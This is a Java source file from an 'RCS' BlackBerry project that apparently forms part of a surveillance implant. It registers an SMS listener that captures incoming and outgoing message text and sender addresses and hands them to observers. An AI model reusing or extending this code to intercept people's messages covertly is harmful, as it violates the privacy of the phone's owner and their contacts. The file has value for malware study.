//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.sms;

import java.io.IOException;
import java.io.UnsupportedEncodingException;

import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.system.RuntimeStore;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;
import blackberry.utils.Check;

public class SmsListener45 extends SmsListener{

    private static final long GUID = 0xe78b740082783262L;

    //#ifdef DEBUG
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
    //#endif

    private MessageConnection smsconn;
    private Thread inThread;
    private SMSInOutListener45 inoutsms;

    //private MessageAgent messageAgent;
    static SmsListener45 instance;

    private SmsListener45() {
    }

    /*
     * public void setMessageAgent(final MessageAgent messageAgent) {
     * this.messageAgent = messageAgent; }
     */

    public synchronized static SmsListener45 getInstance() {

        if (instance == null) {
            instance = (SmsListener45) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final SmsListener45 singleton = new SmsListener45();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

  

    public synchronized boolean isRunning() {
        final boolean ret = smsconn != null;

        //#ifdef DBC
        Check.asserts((smsconn != null) == ret,
                "isRunning, bad status smsconn: " + ret);
        Check.asserts((inoutsms != null) == ret,
                "isRunning, bad status inoutsms: " + ret);
        Check.asserts((inThread != null) == ret,
                "isRunning, bad status inThread: " + ret);
        //#endif

        return ret;
    }

    public int getTotOut() {
        return SMSInOutListener45.totOut;
    }

    public int getTotIn() {
        return SMSInOutListener45.totIn;
    }

    protected synchronized final void start() {
        if (isRunning()) {
            //#ifdef DEBUG
            debug.error("already running");
            //#endif
            return;
        }
        try {
            smsconn = (MessageConnection) Connector.open("sms://:0");

            //#ifdef DEBUG
            debug.trace("start: SMSListener");
            //#endif

            inoutsms = new SMSInOutListener45(smsconn, this);

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

        inThread = new Thread(inoutsms);
        inThread.start();

        try {
            if (smsconn != null) {
                smsconn.setMessageListener(inoutsms);
            }
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }
    }

    protected synchronized final void stop() {
        if (!isRunning()) {
            //#ifdef DEBUG
            debug.error("already not running");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.info("Stopping SMSListener");
        //#endif
        try {
            if (smsconn != null) {
                //#ifdef DEBUG
                debug.trace("stop: smsconn");
                //#endif

                smsconn.setMessageListener(null);
                smsconn.close();

            }
            if (inoutsms != null) {
                //#ifdef DEBUG
                debug.trace("stop: inoutsms");
                //#endif
                inoutsms.stop();
            }

            if (inThread != null) {
                //#ifdef DEBUG
                debug.trace("stop: joining inThread");
                //#endif

                inThread.join();

                //#ifdef DEBUG
                debug.trace("stop: joined inThread");
                //#endif
            }

        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        } finally {
            smsconn = null;
            inoutsms = null;
            inThread = null;
        }

        //#ifdef DBC
        Check.ensures(!isRunning(), "Shouldn't be running, now");
        //#endif
    }

    public void run() {

    }

    synchronized boolean dispatch(
            final javax.wireless.messaging.Message message,
            final boolean incoming) {

        final int size = smsObservers.size();
        for (int i = 0; i < size; i++) {

            final SmsObserver observer = (SmsObserver) smsObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer);
            //#endif

            String dataMsg = getSmsDataMessage(message);
            String address = message.getAddress();
            observer.onNewSms(dataMsg, address, incoming);
        }

        return true;
        //return saveLog(message, incoming);
    }
    
    /**
     * @param message
     * @param dataMsg
     * @return
     */
    private String getSmsDataMessage(
            final javax.wireless.messaging.Message message) {


        if (message instanceof TextMessage) {
            final TextMessage tm = (TextMessage) message;
            final String msg = tm.getPayloadText();
            //#ifdef DEBUG
            debug.info("Got Text SMS: " + msg);
            //#endif

            return msg;

        } else if (message instanceof BinaryMessage) {
            
            
            byte[] dataMsg = ((BinaryMessage) message).getPayloadData();

            try {

                //String msg16 = new String(data, "UTF-16BE");
                final String msg8 = new String(dataMsg, "UTF-8");

                //#ifdef DEBUG
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif

            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
            
            return "binary data";
        }
        
        return "unsupported";
        
    }

}